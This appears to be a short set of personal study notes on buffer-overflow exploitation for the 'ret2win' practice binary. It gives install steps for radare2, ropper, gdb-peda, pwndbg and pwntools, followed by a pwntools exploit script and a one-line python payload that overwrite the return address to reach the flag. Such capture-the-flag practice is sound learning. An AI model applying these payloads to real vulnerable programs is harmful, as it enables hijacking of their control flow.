# Buffer Overflows


## Security level



## Tools install 


### radare2 

```
sudo apt install radare2
```

```
r2 ret2win
> aaaa         : analyse binary
> afl          : function list
> pdf @ main   : disassemble function
```


### ropper 

```
apt install python3-pip
pip install ropper
```

### ghydra 



### gdb-peda

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```
```
pattern_create 200
pattern offset AA0AAFAAb
r

```

### gdb-pwndbg

pwndbg
Built as a successor to frameworks like PEDA and GEF
pwndbg is a plugin for GDB that greatly enhances its exploit development capability. 
https://github.com/pwndbg/pwndbg
```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```


### python3 pwn 

```
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
pip install --upgrade pip
pip install --upgrade pwntools
```

```
from pwn import *
elf = context.binary = ELF('ret2win') 
info("%#x target", elf.symbols.ret2win) 

io = process(elf.path)
ret2win = p64(elf.symbols.ret2win)
payload = "A"*40 + ret2win

io.sendline(payload)
io.recvuntil("Here's your flag:") 
flag = io.recvline()
success(flag)
```

### bash 

```
python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
```

